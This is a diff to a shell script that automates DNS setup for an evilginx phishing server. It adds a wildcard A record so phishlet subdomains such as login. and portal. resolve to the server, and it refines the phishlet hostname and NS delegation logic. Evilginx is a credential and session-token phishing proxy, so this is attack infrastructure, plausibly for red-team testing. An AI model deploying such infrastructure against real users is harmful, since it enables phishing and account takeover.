@@ -62,16 +62,19 @@ echo " Domain: ${BASE_DOMAIN}"
 echo " Server: ${SERVER_IP}"
 echo "==========================================="
 
-# A record for the evilginx server
+# A record for the base domain
 create_record "A" "${BASE_DOMAIN}" "${SERVER_IP}"
 
-# A record for the phishlet hostname
-if [ -n "${PHISHLET_HOSTNAME}" ]; then
+# A record for the phishlet hostname (if different from base domain)
+if [ -n "${PHISHLET_HOSTNAME}" ] && [ "${PHISHLET_HOSTNAME}" != "${BASE_DOMAIN}" ]; then
     create_record "A" "${PHISHLET_HOSTNAME}" "${SERVER_IP}"
 fi
 
-# NS delegation for evilginx subdomain handling
-# Evilginx needs to be authoritative for its subdomains
+# Wildcard A record — phishlets create subdomains (login.HOSTNAME, portal.HOSTNAME, etc.)
+# that all need to resolve to the server IP
+create_record "A" "*.${PHISHLET_HOSTNAME:-${BASE_DOMAIN}}" "${SERVER_IP}"
+
+# NS delegation for evilginx subdomain handling (only when phishlet hostname is a subdomain)
 if [[ "${PHISHLET_HOSTNAME}" == *".${BASE_DOMAIN}" ]]; then
     EVILGINX_NS_SUB="${PHISHLET_HOSTNAME%.${BASE_DOMAIN}}"
 else
